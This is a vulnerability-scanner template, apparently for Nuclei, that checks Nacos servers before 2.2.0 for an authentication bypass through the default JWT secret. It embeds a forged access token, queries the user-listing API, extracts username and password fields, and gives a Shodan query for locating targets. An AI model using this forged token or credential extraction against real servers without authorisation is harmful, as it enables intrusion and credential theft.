http:
- extractors:
  - json:
    - .pageItems[]
    name: extracted-credentials
    part: body
    type: json
  matchers:
  - condition: and
    type: word
    words:
    - '"username":'
    - '"password":'
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}'
  - '{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}'
  stop-at-first-match: true
id: nacos-authentication-bypass
info:
  author: Esonhugh
  classification:
    cpe: cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*
  description: 'The authentication function of Nacos is can be bypass through default
    JWT secret.

    '
  metadata:
    max-request: 2
    product: nacos
    shodan-query: title:"Nacos"
    vendor: alibaba
    verified: true
  name: Nacos < 2.2.0 - Authentication Bypass
  reference:
  - https://github.com/alibaba/nacos/issues/10060
  - https://avd.aliyun.com/detail?id=AVD-2023-1655789
  - https://nacos.io/zh-cn/docs/auth.html
  remediation: Change value of jwt secret in the configurations
  severity: critical
  tags: auth-bypass,nacos,misconfig,jwt,vuln
variables:
  token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g
